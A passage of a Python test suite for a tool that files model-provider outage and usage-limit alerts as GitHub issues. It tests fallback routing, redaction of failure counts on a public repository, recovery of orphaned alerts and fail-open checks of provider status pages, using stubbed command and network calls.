        chk("both routes unusable -> action reported undelivered", len(undelivered), 1)

        # (c) end-to-end: _cmd_decide returns NONZERO when the alert cannot be delivered.
        #     Stub the ledger + fleet + probe so a firing outage reaches delivery deterministically.
        import argparse as _ap
        global GitHubAPI, _enabled_provider_accounts, annotate_provider_status, prune, read_ledger
        real = (GitHubAPI, _enabled_provider_accounts, annotate_provider_status, prune, read_ledger)
        try:
            GitHubAPI = lambda token: object()
            read_ledger = lambda api, repo: ([], None)
            prune = lambda records, now: []
            _enabled_provider_accounts = lambda api, repo, policy, salt: {}
            annotate_provider_status = lambda actions, **kw: None  # no-op (probe-free)
            # force a single firing action regardless of records
            global classify_records
            real_classify = classify_records
            classify_records = lambda records, fleet, now, open_alerts=(): [dict(fire)]
            _gh, calls[:] = fake_gh({"priv", "amb"}), []
            chk("decide exits NONZERO when no route can deliver the alert (#175)",
                _cmd_decide(_ap.Namespace(policy_file="policy/repos.toml")), 1)
            classify_records = real_classify
        finally:
            (GitHubAPI, _enabled_provider_accounts, annotate_provider_status,
             prune, read_ledger) = real

        # (d) no private ALERT_TOKEN at all -> primary IS the registry; no pointless retry, and a
        #     failing ambient token is reported undelivered (fail-closed, never a silent green).
        os.environ["ALERT_TOKEN"] = ""
        _gh, calls[:] = fake_gh({"amb"}), []
        undelivered = _deliver_alerts([fire], "m")
        chk("registry-only route with a bad ambient token is undelivered", len(undelivered), 1)
        chk("registry-only route is not retried against itself",
            sum(1 for c in creates()), 1)

        # (e) review round 2: a FAILED private recovery (fire=false, open marker on the private
        #     route, close fails) must stay undelivered. Pre-fix, the registry fallback found no
        #     open marker, returned True as a steady no-op, and the failed close vanished green.
        os.environ["ALERT_TOKEN"] = "priv"  # restore the private route cleared by (d)
        recover = {**fire, "fire": False}
        marker = _marker(recover["condition"], recover["provider"])

        def recovery_gh(args, token, capture=False):
            repo = args[args.index("-R") + 1] if "-R" in args else None
            calls.append((args[0], args[1] if args[0] == "issue" else None, token, repo))
            if args[:2] == ["issue", "list"]:
                if repo == "jeswr/agent-account-data":
                    return types.SimpleNamespace(
                        returncode=0, stdout=json.dumps([{"number": 7, "body": marker}]),
                        stderr="")
                return types.SimpleNamespace(returncode=0, stdout="[]", stderr="")
            if args[:2] == ["issue", "close"]:
                return types.SimpleNamespace(returncode=1, stdout="", stderr="")
            return types.SimpleNamespace(returncode=0, stdout="", stderr="")

        _gh, calls[:] = recovery_gh, []
        undelivered = _deliver_alerts([recover], "m")
        chk("failed private recovery stays undelivered (fallback no-op cannot confirm it)",
            len(undelivered), 1)
        chk("recovery never retries cross-repo (no registry calls on fire=false)",
            any(r == "jeswr/agent-account-registry" for (_, _, _, r) in calls), False)
    finally:
        _gh = real_gh
        for k, v in saved.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v
    return True


def _test_redaction(chk):
    """sol-audit issue #204: a model-health alert filed on the PUBLIC registry repo must carry a
    generic body — provider + condition only — with the failure/fleet COUNTS (the `reason`), the
    reset hints, and the status diagnostics SUPPRESSED. Only the verified private ALERT_REPO+
    ALERT_TOKEN route renders the full detail. Mutation strength: dropping `redact=` from
    render_body/_upsert_alert republishes the counts on the registry and turns the public-route
    assertions RED; leaving the private route redacted turns the full-body assertions RED."""
    import contextlib
    import io
    import types
    global _gh
    real_gh = _gh
    saved = {k: os.environ.get(k) for k in
             ("REGISTRY_REPO", "ALERT_REPO", "ALERT_TOKEN", "REGISTRY_ALERT_TOKEN", "GH_TOKEN")}
    outage = {"condition": "provider-outage", "provider": "anthropic", "fire": True,
              "reason": "5 model-launch failures across 3 of 8 accounts in 10 min with no "
                        "per-account successes"}
    capped = {"condition": "provider-capped", "provider": "openai", "fire": True,
              "reason": "all 4 enabled openai accounts are usage-limited",
              "reset_hint": "2026-07-20 14:00 UTC"}
    # --- pure render: private (full) body enumerates counts + reset; public (redacted) body
    #     suppresses them but keeps provider/condition/marker + the fix-it hint.
    full_o = render_body(outage, "m")
    red_o = render_body(outage, "m", redact=True)
    chk("full outage body carries the failure counts (private route)",
        "3 of 8 accounts" in full_o, True)
    chk("redacted outage body SUPPRESSES the failure counts (#204)",
        ("3 of 8 accounts" in red_o, "5 model-launch failures" in red_o), (False, False))
    chk("redacted outage body keeps provider/condition + marker + private-route hint",
        (_marker("provider-outage", "anthropic") in red_o, "anthropic" in red_o,
         "provider-outage" in red_o, "SUPPRESSED" in red_o,
         "ALERT_REPO" in red_o, "ALERT_TOKEN" in red_o),
        (True, True, True, True, True, True))
    full_c = render_body(capped, "m")
    red_c = render_body(capped, "m", redact=True)
    chk("full capped body carries the reset time (private route)",
        ("2026-07-20 14:00 UTC" in full_c, "Earliest known reset" in full_c), (True, True))
    chk("redacted capped body SUPPRESSES the reset time + count (#204)",
        ("2026-07-20 14:00 UTC" in red_c, "Earliest known reset" in red_c,
         "all 4 enabled" in red_c),
        (False, False, False))
    # --- end-to-end wiring: with NO POSITIVELY VERIFIED private route the delivered body is
    #     redacted; with one it is full. A capturing gh records the create --body per repo and
    #     answers the #432 round-1 visibility verification per `visibility` — so a regression
    #     that stops CHECKING visibility (or trusts configuration alone) goes RED on the
    #     public-repo / failed-lookup / same-repo cases below.
    created = {}
    visibility = {"stdout": json.dumps({"private": True}), "rc": 0}
    vis_calls = []

    def capture_gh(args, token, capture=False):
        repo = args[args.index("-R") + 1] if "-R" in args else None
        if args[0] == "api":
            vis_calls.append((list(args), token))
            return types.SimpleNamespace(returncode=visibility["rc"],
                                         stdout=visibility["stdout"], stderr="")
        if args[:2] == ["issue", "list"]:
            return types.SimpleNamespace(returncode=0, stdout="[]", stderr="")
        if args[:2] == ["issue", "create"]:
            created[repo] = args[args.index("--body") + 1]
        return types.SimpleNamespace(returncode=0, stdout="", stderr="")

    try:
        # (a) no ALERT_REPO -> primary IS the public registry -> redacted body, and the
        # visibility stub answering "private" must not matter (same-repo rejection is absolute).
        os.environ["REGISTRY_REPO"] = "jeswr/agent-account-registry"
        os.environ["REGISTRY_ALERT_TOKEN"] = "amb"
        os.environ.pop("GH_TOKEN", None)
        os.environ.pop("ALERT_REPO", None)
        os.environ.pop("ALERT_TOKEN", None)
        created.clear()
        _gh = capture_gh
        with contextlib.redirect_stdout(io.StringIO()):
            _deliver_alerts([dict(outage)], "m")
        body = created.get("jeswr/agent-account-registry", "")
        chk("END-TO-END no-private-route: registry body is redacted (no counts, SUPPRESSED)",
            ("3 of 8 accounts" in body, "SUPPRESSED" in body), (False, True))
        # (b) CONFIRMED-private route -> full body on the private repo, and the visibility
        # lookup ran against the ALERT repo under the ALERT token.
        created.clear()
        vis_calls.clear()
        os.environ["ALERT_REPO"] = "jeswr/agent-account-data"
        os.environ["ALERT_TOKEN"] = "priv"
        with contextlib.redirect_stdout(io.StringIO()):
            _deliver_alerts([dict(outage)], "m")
        pbody = created.get("jeswr/agent-account-data", "")
        chk("END-TO-END private route: private body is FULL (counts present, not redacted)",
            ("3 of 8 accounts" in pbody, "SUPPRESSED" in pbody), (True, False))
        chk("END-TO-END private route: visibility verified via GET /repos under ALERT_TOKEN "
            "(#432 r1)",
            vis_calls, [(["api", "repos/jeswr/agent-account-data"], "priv")])
        # (c) #432 round 1: a PUBLIC ALERT_REPO (private=false) must deliver the REDACTED body —
        # token presence is not privacy.
        created.clear()
        visibility["stdout"] = json.dumps({"private": False})
        with contextlib.redirect_stdout(io.StringIO()):
            _deliver_alerts([dict(outage)], "m")
        pub_body = created.get("jeswr/agent-account-data", "")
        chk("END-TO-END public ALERT_REPO: body is REDACTED (fail closed, #432 r1)",
            ("3 of 8 accounts" in pub_body, "SUPPRESSED" in pub_body), (False, True))
        # (d) #432 round 1: a FAILED/indeterminate visibility lookup redacts too.
        created.clear()
        visibility.update(stdout="", rc=1)
        with contextlib.redirect_stdout(io.StringIO()):
            _deliver_alerts([dict(outage)], "m")
        unk_body = created.get("jeswr/agent-account-data", "")
        chk("END-TO-END failed visibility lookup: body is REDACTED (fail closed, #432 r1)",
            ("3 of 8 accounts" in unk_body, "SUPPRESSED" in unk_body), (False, True))
        # (e) #432 round 1: ALERT_REPO naming the REGISTRY itself is rejected by the same-repo
        # clause alone — the visibility stub deliberately answers "private" so only the
        # equality check can force the redaction.
        created.clear()
        visibility.update(stdout=json.dumps({"private": True}), rc=0)
        os.environ["ALERT_REPO"] = "jeswr/agent-account-registry"
        with contextlib.redirect_stdout(io.StringIO()):
            _deliver_alerts([dict(outage)], "m")
        same_body = created.get("jeswr/agent-account-registry", "")
        chk("END-TO-END ALERT_REPO == REGISTRY_REPO: body is REDACTED (#432 r1)",
            ("3 of 8 accounts" in same_body, "SUPPRESSED" in same_body), (False, True))
    finally:
        _gh = real_gh
        for k, v in saved.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v
    return True


def _test_fallback_orphan(chk):
    """Review #340: an alert CREATED ON THE FALLBACK ROUTE (by the #175 firing retry) must still
    be recovered. End-to-end against a stateful two-repo gh fake: primary firing delivery fails,
    the fallback create succeeds, the records age out, and the next decide closes the fallback
    issue — with the red direction proving a failed fallback close is NOT confirmed by the
    primary's steady no-op (pre-fix, decide exited 0 and the issue stayed open forever).

    Issue #292 pins the OTHER half of that conjunction, which nothing here discriminated: with the
    marker open on BOTH routes, a CONFIRMED fallback close must not mask a FAILED primary one.
    Dropping the `and delivered` in _deliver_alerts survived the whole suite until phase 3."""
    import argparse as _ap
    import types
    global _gh, GitHubAPI, _enabled_provider_accounts, annotate_provider_status, prune, read_ledger
    real_gh = _gh
    real = (GitHubAPI, _enabled_provider_accounts, annotate_provider_status, prune, read_ledger)
    saved = {k: os.environ.get(k) for k in
             ("REGISTRY_REPO", "ALERT_REPO", "ALERT_TOKEN", "REGISTRY_ALERT_TOKEN", "GH_TOKEN")}
    priv_repo, reg_repo = "jeswr/agent-account-data", "jeswr/agent-account-registry"
    repos = {priv_repo: {}, reg_repo: {}}
    seq = {"n": 100}
    bad_tokens = {"priv"}          # phase 1: the private token is unusable
    fail_close = {"repos": set()}  # repos whose `issue close` fails, PER ROUTE (#292)

    def state_gh(args, token, capture=False):
        repo = args[args.index("-R") + 1] if "-R" in args else None
        if args[0] == "label":
            return types.SimpleNamespace(returncode=0, stdout="", stderr="")
        if token in bad_tokens:
            return types.SimpleNamespace(returncode=1, stdout="", stderr="")
        if args[0] == "api":
            # The #432 round-1 visibility verification: a working token reads the private route
            # as PRIVATE (an unusable one already answered rc=1 above -> fail-closed redact).
            return types.SimpleNamespace(returncode=0,
                                         stdout=json.dumps({"private": True}), stderr="")
        verb, issues = args[1], repos[repo]
        if verb == "list":
            state = args[args.index("--state") + 1]
            out = [{"number": n, "body": i["body"]}
                   for n, i in sorted(issues.items()) if i["state"] == state]
            return types.SimpleNamespace(returncode=0, stdout=json.dumps(out), stderr="")
        if verb == "create":
            seq["n"] += 1
            issues[seq["n"]] = {"body": args[args.index("--body") + 1], "state": "open"}
            return types.SimpleNamespace(returncode=0, stdout="", stderr="")
        num = int(args[2])
        if verb == "close":
            if repo in fail_close["repos"]:
                return types.SimpleNamespace(returncode=1, stdout="", stderr="")
            issues[num]["state"] = "closed"
        elif verb == "edit":
            issues[num]["body"] = args[args.index("--body") + 1]
        elif verb == "reopen":
            issues[num]["state"] = "open"
        return types.SimpleNamespace(returncode=0, stdout="", stderr="")

    def reg_states():
        return [i["state"] for _, i in sorted(repos[reg_repo].items())]

    def priv_states():
        return [i["state"] for _, i in sorted(repos[priv_repo].items())]

    fire = {"condition": "provider-outage", "provider": "anthropic", "fire": True, "reason": "r"}
    try:
        os.environ.update(REGISTRY_REPO=reg_repo, ALERT_REPO=priv_repo, ALERT_TOKEN="priv",
                          REGISTRY_ALERT_TOKEN="amb")
        os.environ.pop("GH_TOKEN", None)
        _gh = state_gh

        # phase 1: primary firing delivery fails -> the alert is CREATED on the fallback.
        chk("fallback-orphan: firing delivered via the fallback create",
            _deliver_alerts([fire], "m"), [])
        chk("fallback-orphan: the issue lives on the registry, none on the private route",
            (reg_states(), repos[priv_repo]), (["open"], {}))

        # phase 2: the private token works again and the records have aged out. decide must
        # enumerate the fallback marker, emit the orphan recovery, and close it THERE.
        bad_tokens.clear()
        GitHubAPI = lambda token: object()
        read_ledger = lambda api, repo: ([], None)
        prune = lambda records, now: []
        _enabled_provider_accounts = lambda api, repo, policy, salt: {}
        annotate_provider_status = lambda actions, **kw: None
        ns = _ap.Namespace(policy_file="policy/repos.toml")

        # red direction first: the fallback close FAILS -> the primary's steady no-op must not
        # count as delivery (pre-fix, decide exited 0 here with the issue still open).
        fail_close["repos"] = {reg_repo}
        chk("fallback-orphan: failed fallback close -> decide exits NONZERO, issue still open",
            (_cmd_decide(ns), reg_states()), (1, ["open"]))

        fail_close["repos"] = set()
        chk("fallback-orphan: next decide closes the fallback issue and exits 0",
            (_cmd_decide(ns), reg_states()), (0, ["closed"]))

        # phase 3 (issue #292): get the marker open on BOTH routes. A firing tick while the
        # private token is unusable REOPENS the fallback issue; once the token works again the
        # next firing tick raises the private issue too, because the primary carries no marker.
        bad_tokens.add("priv")
        chk("fallback-orphan: firing re-raise reopens the fallback issue",
            (_deliver_alerts([fire], "m"), reg_states()), ([], ["open"]))
        bad_tokens.clear()
        chk("fallback-orphan: firing on the restored primary raises the private issue too",
            (_deliver_alerts([fire], "m"), priv_states()), ([], ["open"]))

        # The direction #292 pins: the PRIMARY close fails while the fallback close is CONFIRMED.
        # Recovery must require BOTH routes, so decide stays NONZERO and the private issue stays
        # open for the next tick. Without `and delivered` this reads (0, ['closed'], ['open']) —
        # a confirmed fallback close silently certifying an alert that is still open privately.
        fail_close["repos"] = {priv_repo}
        chk("fallback-orphan: a confirmed fallback close does NOT mask a FAILED primary close",
            (_cmd_decide(ns), reg_states(), priv_states()), (1, ["closed"], ["open"]))

        # phase 4: both routes healthy. The fallback marker is gone, so recovery targets the
        # primary alone, closes the surviving private issue, and the run goes green.
        fail_close["repos"] = set()
        chk("fallback-orphan: the next tick closes the surviving private issue and exits 0",
            (_cmd_decide(ns), priv_states()), (0, ["closed"]))
    finally:
        _gh = real_gh
        (GitHubAPI, _enabled_provider_accounts, annotate_provider_status,
         prune, read_ledger) = real
        for k, v in saved.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v
    return True


def _test_firing_supersede(chk):
    """Issue #344: while a condition keeps FIRING, a recovered primary route must not leave the
    copy the #175 retry created on the fallback open with a stale body. Against the same stateful
    two-repo gh fake, the tick after the primary recovers must close the fallback copy (with a
    comment) while the primary carries the live alert.

    The red directions this pins, each of which survived the rest of the suite: closing the copy
    the FAILED-primary retry just delivered to (that erases the alert outright), reaching for the
    fallback when its marker was never enumerated, and folding the dedup result into `undelivered`
    (a cosmetic duplicate must not turn a delivered alert into a red run — it retries next tick).
    Deleting the supersede branch turns phase 2 red with the duplicate still open.

    Phase 6 pins the same-repository-distinct-token configuration, where the credential fallback is
    armed but there is only ONE issue to speak of: keying the dedup on the (repo, token) pair
    instead of the repository name closes the live firing alert (round 1 of #1455)."""
    import types
    global _gh
    real_gh = _gh
    saved = {k: os.environ.get(k) for k in
             ("REGISTRY_REPO", "ALERT_REPO", "ALERT_TOKEN", "REGISTRY_ALERT_TOKEN", "GH_TOKEN")}
    priv_repo, reg_repo = "jeswr/agent-account-data", "jeswr/agent-account-registry"
    repos = {priv_repo: {}, reg_repo: {}}
    seq = {"n": 200}
    bad_tokens = set()
    fail_close = {"repos": set()}
    calls = []

    def state_gh(args, token, capture=False):
        repo = args[args.index("-R") + 1] if "-R" in args else None
        calls.append((args[1] if args[0] == "issue" else args[0], repo))
        if args[0] == "label":
            return types.SimpleNamespace(returncode=0, stdout="", stderr="")
        if token in bad_tokens:
            return types.SimpleNamespace(returncode=1, stdout="", stderr="")
        if args[0] == "api":
            return types.SimpleNamespace(returncode=0,
                                         stdout=json.dumps({"private": True}), stderr="")
        verb, issues = args[1], repos[repo]
        if verb == "list":
            state = args[args.index("--state") + 1]
            out = [{"number": n, "body": i["body"]}
                   for n, i in sorted(issues.items()) if i["state"] == state]
            return types.SimpleNamespace(returncode=0, stdout=json.dumps(out), stderr="")
        if verb == "create":
            seq["n"] += 1
            issues[seq["n"]] = {"body": args[args.index("--body") + 1], "state": "open"}
            return types.SimpleNamespace(returncode=0, stdout="", stderr="")
        num = int(args[2])
        if verb == "close":
            if repo in fail_close["repos"]:
                return types.SimpleNamespace(returncode=1, stdout="", stderr="")
            issues[num]["state"] = "closed"
        elif verb == "edit":
            issues[num]["body"] = args[args.index("--body") + 1]
        elif verb == "reopen":
            issues[num]["state"] = "open"
        return types.SimpleNamespace(returncode=0, stdout="", stderr="")

    def states(repo):
        return [i["state"] for _, i in sorted(repos[repo].items())]

    fire = {"condition": "provider-outage", "provider": "anthropic", "fire": True, "reason": "r"}
    key = (fire["condition"], fire["provider"])
    try:
        os.environ.update(REGISTRY_REPO=reg_repo, ALERT_REPO=priv_repo, ALERT_TOKEN="priv",
                          REGISTRY_ALERT_TOKEN="amb")
        os.environ.pop("GH_TOKEN", None)
        _gh = state_gh

        # phase 1 (#175): the primary is transiently unusable -> the alert is CREATED on the
        # fallback. This is the only way the duplicate arises.
        bad_tokens.add("priv")
        chk("supersede: the firing retry creates the fallback copy",
            (_deliver_alerts([fire], "m"), states(reg_repo)), ([], ["open"]))

        # phase 2: the primary recovers and takes the still-firing alert. Pre-fix this refreshed
        # the primary and left the fallback copy open with the body it was created with — two
        # divergent open issues for one condition until the eventual recovery closed both.
        bad_tokens.clear()
        calls[:] = []
        chk("supersede: the recovered primary takes the alert and closes the fallback copy",
            (_deliver_alerts([fire], "m", {key}), states(priv_repo), states(reg_repo)),
            ([], ["open"], ["closed"]))
        chk("supersede: the closed copy is explained by exactly one comment, on the fallback",
            [c for c in calls if c[0] == "comment"], [("comment", reg_repo)])

        # phase 3: no fallback marker enumerated -> the fallback repo is never touched at all
        # (the snapshot is the whole trigger; nothing goes hunting cross-repo every tick).
        calls[:] = []
        chk("supersede: a firing tick with no fallback marker never touches the fallback repo",
            (_deliver_alerts([fire], "m"), [c for c in calls if c[1] == reg_repo]), ([], []))

        # phase 4: the primary fails again -> the #175 retry REOPENS the fallback copy, which is
        # now where the alert lives. The marker is in the snapshot, so the supersede branch must
        # stay out of the way: closing here would erase the only copy of a firing alert.
        bad_tokens.add("priv")
        chk("supersede: never closes the copy the failed-primary retry just delivered to",
            (_deliver_alerts([fire], "m", {key}), states(reg_repo)), ([], ["open"]))

        # phase 5: a FAILED dedup close is not a delivery failure — the alert reached the
        # maintainer on the primary — so the action stays delivered and the duplicate is left for
        # the next tick, which closes it.
        bad_tokens.clear()
        fail_close["repos"] = {reg_repo}
        calls[:] = []
        chk("supersede: a FAILED dedup close leaves the alert DELIVERED, duplicate still open",
            (_deliver_alerts([fire], "m", {key}), states(reg_repo)), ([], ["open"]))
        chk("supersede: no comment is posted on a failed close",
            any(c[0] == "comment" for c in calls), False)
        fail_close["repos"] = set()
        chk("supersede: the next tick closes the still-open duplicate",
            (_deliver_alerts([fire], "m", {key}), states(reg_repo)), ([], ["closed"]))

        # phase 6 (review round 1 of #1455): ALERT_REPO == REGISTRY_REPO with a DISTINCT
        # ALERT_TOKEN. The credential fallback stays armed (the pairs differ), but both routes name
        # ONE repository, so _cmd_decide enumerates the PRIMARY's own markers into `fallback_open`
        # and the "superseded copy" is the live firing issue. Keying the dedup on the (repo, token)
        # pair closes it and erases the only open alert; keying it on the repository NAME leaves it
        # alone. Phases 1-5 fix the two repos to different names and cannot see this.
        repos[reg_repo] = {}
        os.environ.update(ALERT_REPO=reg_repo)
        chk("supersede: same-repo distinct-token route files the firing alert as usual",
            (_deliver_alerts([fire], "m"), states(reg_repo)), ([], ["open"]))
        calls[:] = []
        chk("supersede: a same-repo fallback marker never closes the live firing alert",
            (_deliver_alerts([fire], "m", {key}), states(reg_repo)), ([], ["open"]))
        chk("supersede: and no close/comment is issued against the primary's own repository",
            [c for c in calls if c[0] in ("close", "comment")], [])
    finally:
        _gh = real_gh
        for k, v in saved.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v
    return True


def _test_fleet(chk):
    """_enabled_provider_accounts maps enabled-pool handles -> {provider: {salted hashes}} and
    emits NO raw handle. Uses a stub API returning a policy-pool + account catalog."""
    import tempfile
    salt = "s3cret"
    with tempfile.NamedTemporaryFile("w", suffix=".toml", delete=False) as fh:
        fh.write('[repos."o/a"]\nenabled = true\naccount_pool = ["acct01", "acct02"]\n'
                 '[repos."o/b"]\nenabled = false\naccount_pool = ["acct99"]\n')
        policy = fh.name

    class _CatalogAPI:
        def paginate(self, path):
            return [
                {"title": "acct01", "body": "provider: anthropic\nmodels: [fable]"},
                {"title": "acct02", "body": "provider: openai\nmodels: [terra]"},
                {"title": "acct99", "body": "provider: openai\nmodels: [gpt]"},  # disabled row
                {"title": "acct01", "pull_request": {}, "body": "ignore PRs"},
            ]

    got = _enabled_provider_accounts(_CatalogAPI(), "o/r", policy, salt)
    empty = _enabled_provider_accounts(_CatalogAPI(), "o/r", policy, "")
    os.unlink(policy)
    want = {"anthropic": {account_hash("acct01", salt)},
            "openai": {account_hash("acct02", salt)}}
    chk("fleet maps enabled pool to provider+hash", got, want)
    chk("fleet emits no raw handle", "acct01" not in json.dumps(sorted(
        h for hs in got.values() for h in hs)), True)
    chk("fleet empty without salt", empty, {})
    return True


def _test_provider_status(chk):
    """Provider status probe (issue #70): recorded Statuspage fixtures for ALL FOUR indicators
    plus the unreachable path. FAIL-OPEN is mutation-checked: a raising fetch must fold to
    ('unknown', '') — deleting the except in probe_provider_status crashes this test red — and
    annotation must never flip `fire` off, whatever the probe says."""
    # Recorded fixture: the real status.claude.com/status.openai.com /api/v2/status.json shape.
    def fixture(indicator, description):
        return {"page": {"id": "23dnwm3xnarn", "name": "Claude",
                         "url": "https://status.claude.com", "updated_at": "2026-07-17T00:00:00Z"},
                "status": {"indicator": indicator, "description": description}}

    chk("indicator none -> operational",
        classify_status_payload(fixture("none", "All Systems Operational")),
        (STATUS_OPERATIONAL, "none"))
    chk("indicator minor -> degraded",
        classify_status_payload(fixture("minor", "Partially Degraded Service")),
        (STATUS_DEGRADED, "minor"))
    chk("indicator major -> outage",
        classify_status_payload(fixture("major", "Partial System Outage")),
        (STATUS_OUTAGE, "major"))
    chk("indicator critical -> outage",
        classify_status_payload(fixture("critical", "Major System Outage")),
        (STATUS_OUTAGE, "critical"))
    chk("novel indicator -> unknown (fail-open fold)",
        classify_status_payload(fixture("maintenance", "x"))[0], STATUS_UNKNOWN)
    chk("malformed payload -> unknown",
        classify_status_payload({"status": "green"}), (STATUS_UNKNOWN, ""))
    chk("non-dict payload -> unknown",
        classify_status_payload(None), (STATUS_UNKNOWN, ""))

    # probe: URL pinning + FAIL-OPEN on unreachable (the mutation check)
    calls = []

    def ok_fetch(url):
        calls.append(url)
        return fixture("minor", "d")

    def unreachable(url):
        raise HealthError("stub: connection timed out")

    chk("probe anthropic folds the fetched indicator",
        probe_provider_status("anthropic", fetch=ok_fetch), (STATUS_DEGRADED, "minor"))
    chk("probe openai hits its own recorded URL",
        (probe_provider_status("openai", fetch=ok_fetch), calls[-1]),
        ((STATUS_DEGRADED, "minor"), "https://status.openai.com/api/v2/status.json"))
    chk("probe pins the recorded anthropic URL",
        calls[0], "https://status.claude.com/api/v2/status.json")
    chk("UNREACHABLE fails OPEN to unknown (mutation: drop the except -> crashes red)",
        probe_provider_status("anthropic", fetch=unreachable), (STATUS_UNKNOWN, ""))
    chk("unmapped provider -> unknown without any fetch",
        probe_provider_status("fleet", fetch=unreachable), (STATUS_UNKNOWN, ""))

    # annotation: firing outage/transient only, one probe per provider, fire NEVER touched
    probes = []

    def probe(provider):
        probes.append(provider)
        return STATUS_OPERATIONAL, "none"

    actions = [
        {"condition": "persistent-transient", "provider": "anthropic", "fire": True, "reason": "r"},
        {"condition": "provider-outage", "provider": "anthropic", "fire": True, "reason": "r"},
        {"condition": "provider-capped", "provider": "anthropic", "fire": True, "reason": "r"},
        {"condition": "persistent-transient", "provider": "openai", "fire": False, "reason": "r"},
    ]
    annotate_provider_status(actions, probe=probe)
    chk("one probe per provider, none for quiet/unprobed conditions", probes, ["anthropic"])
    chk("only firing outage/transient actions are annotated",
        [a.get("provider_status") for a in actions],
        [STATUS_OPERATIONAL, STATUS_OPERATIONAL, None, None])
    chk("operational NEVER suppresses: fire flags untouched by annotation",
        [a["fire"] for a in actions], [True, True, True, False])

    # body rendering: SELF-INDUCED / unverified / known-incident / fail-open framings.
    # counts defaults to a pure TRUE-transient burst; finding-2 checks override it.
    def body(cond, status, indicator, counts=None):
        action = {"condition": cond, "provider": "anthropic", "fire": True,
                  "reason": "5 transient/unknown API failures in 15 min",
                  "provider_status": status, "status_indicator": indicator}
        if cond == "persistent-transient":
            action["class_counts"] = (counts if counts is not None
                                      else {CLASS_TRANSIENT: 5, CLASS_UNKNOWN: 0})
        return render_body(action, "m")

    green = body("persistent-transient", STATUS_OPERATIONAL, "none")
    chk("operational TRUE-transient burst is labelled SELF-INDUCED", "SELF-INDUCED" in green, True)
    chk("...with shed-parallelism advice", "SHED PARALLELISM" in green, True)
    chk("...and the provider-status annotation", "provider-status: operational" in green, True)
    # review #72 finding 2: unknown/mixed bursts get the UNVERIFIED framing, never SELF-INDUCED
    all_unknown = body("persistent-transient", STATUS_OPERATIONAL, "none",
                       counts={CLASS_TRANSIENT: 0, CLASS_UNKNOWN: 5})
    chk("operational all-unknown burst is NOT labelled SELF-INDUCED",
        ("SELF-INDUCED" in all_unknown, "SHED PARALLELISM" in all_unknown), (False, False))
    chk("...it gets the unverified framing instead",
        ("cause UNVERIFIED" in all_unknown, "UNATTRIBUTABLE" in all_unknown), (True, True))
    chk("...and its headline drops the retryable-429 claim",
        "individually retryable" in all_unknown, False)
    mixed = body("persistent-transient", STATUS_OPERATIONAL, "none",
                 counts={CLASS_TRANSIENT: 2, CLASS_UNKNOWN: 3})
    chk("mixed burst below the true-transient threshold is unverified",
        ("SELF-INDUCED" in mixed, "cause UNVERIFIED" in mixed), (False, True))
    qualified = body("persistent-transient", STATUS_OPERATIONAL, "none",
                     counts={CLASS_TRANSIENT: 5, CLASS_UNKNOWN: 2})
    chk("a qualifying true-transient burst keeps SELF-INDUCED despite extra unknowns",
        "SELF-INDUCED" in qualified, True)
    no_counts = render_body({"condition": "persistent-transient", "provider": "anthropic",
                             "fire": True, "reason": "r",
                             "provider_status": STATUS_OPERATIONAL,
                             "status_indicator": "none"}, "m")
    chk("missing composition never claims SELF-INDUCED (evidence not held)",
        "SELF-INDUCED" in no_counts, False)
    minor = body("persistent-transient", STATUS_DEGRADED, "minor")
    chk("degraded carries the qualified annotation",
        "provider-status: degraded (minor)" in minor, True)
    chk("degraded uses known-incident framing + harder backoff",
        ("known provider incident" in minor, "back off HARDER" in minor), (True, True))
    crit = body("provider-outage", STATUS_OUTAGE, "critical")
    chk("critical outage carries the qualified annotation",
        "provider-status: outage (critical)" in crit, True)
    chk("outage uses known-incident framing", "known provider incident" in crit, True)
    green_outage = body("provider-outage", STATUS_OPERATIONAL, "none")
    chk("operational outage points at credentials/credits, not the provider",
        "expired tokens" in green_outage, True)
    unknown = body("persistent-transient", STATUS_UNKNOWN, "")
    chk("unknown states the fail-open (never suppressed)",
        ("provider-status: unknown" in unknown, "NEVER suppressed" in unknown), (True, True))
    plain = render_body({"condition": "persistent-transient", "provider": "anthropic",
                         "fire": True, "reason": "r"}, "m")
    chk("unprobed action renders no provider-status line", "provider-status" in plain, False)
    return True


def _test_probe_fetch(chk):
    """The PRODUCTION fetch path (review #72 findings, rounds 2+3): failures raised by
    response.read() MID-BODY — a raw OSError (connection reset) or http.client.IncompleteRead
    (truncated response) — must normalize to HealthError; a TRICKLING response must be
    abandoned at the wall-clock deadline; an OVERSIZED body must trip the size bound. In every
    case the probe fails OPEN instead of stalling or aborting `decide` before the alert
    upsert. urlopen is patched; no network is touched. Mutation strength: dropping the
    OSError/HTTPException normalization crashes the mid-read checks red (the raw exception
    escapes _raises); dropping the deadline thread turns the elapsed-time check red; dropping
    the size cap parses the oversized body successfully and turns its check red."""
    import http.client
    import urllib.request

    class _MidReadResponse:
        def __init__(self, exc):
            self._exc = exc

        def __enter__(self):
            return self

        def __exit__(self, *exc_info):
            return False

        def read(self, amt=None):
            raise self._exc

    real_urlopen = urllib.request.urlopen
    try:
        for name, exc in (("OSError (connection reset)", ConnectionResetError("reset")),
                          ("IncompleteRead", http.client.IncompleteRead(b"partial"))):
            urllib.request.urlopen = (
                lambda request, timeout=None, _exc=exc: _MidReadResponse(_exc))
            chk(f"fetch normalizes mid-read {name} to HealthError",
                _raises(lambda: _fetch_status_json(PROVIDER_STATUS_URLS["anthropic"])), True)
            chk(f"probe production path fails OPEN on mid-read {name}",
                probe_provider_status("anthropic"), (STATUS_UNKNOWN, ""))
    finally:
        urllib.request.urlopen = real_urlopen

    # The annotation boundary itself is a backstop: even an exception class the fetch failed
    # to normalize folds to unknown (mutation: drop the broad except in probe_provider_status
    # -> this crashes red), so a probe surprise can never abort `decide`.
    def unnormalized(url):
        raise RuntimeError("stub: exception class the fetch did not normalize")

    chk("annotation boundary fails OPEN on an unnormalized exception",
        probe_provider_status("anthropic", fetch=unnormalized), (STATUS_UNKNOWN, ""))

    # Review #72 round 3: a peer that TRICKLES bytes — each individual read fast enough that
    # the per-socket-op timeout never fires, but the total unbounded — must not hold the fetch
    # past its wall-clock deadline. The stub yields one byte per 0.15s read forever; with a
    # 0.4s deadline the fetch must abandon it and fail OPEN. Mutation strength: reverting to a
    # direct (threadless) call makes the fetch ride the trickle to its end (~3s), turning the
    # elapsed-time check red.
    class _TrickleResponse:
        def __init__(self):
            self._reads = 0

